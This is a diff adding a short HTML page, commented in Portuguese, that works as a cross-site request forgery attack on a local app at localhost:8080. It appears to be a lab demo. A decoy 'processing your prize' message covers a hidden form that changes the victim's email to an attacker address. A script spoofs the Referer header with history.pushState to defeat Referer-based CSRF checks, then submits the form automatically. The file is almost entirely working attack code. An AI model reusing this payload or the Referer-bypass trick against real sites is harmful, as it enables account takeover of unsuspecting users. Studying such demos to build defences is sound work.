@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Ataque CSRF</title>
+    </head>
+    <body>
+        <h1>Aguarde, processando seu prêmio...</h1>
+        
+        <form id="csrf-form" action="http://localhost:8080/change-email" method="POST">
+            <input type="hidden" name="email" value="atacante@exemplo.com" />
+        </form>
+
+        <script>
+            // O domínio do alvo que queremos forjar no cabeçalho Referer
+            const targetDomain = "http://localhost:8080";
+            
+            // Este truque manipula a URL na barra de endereço do navegador SEM recarregar a página.
+            // A nova URL forjada será enviada no cabeçalho Referer.
+            history.pushState({}, "", "/?" + targetDomain);
+            
+            // Envia o formulário malicioso automaticamente
+            document.getElementById("csrf-form").submit();
+        </script>
+    </body>
+</html>
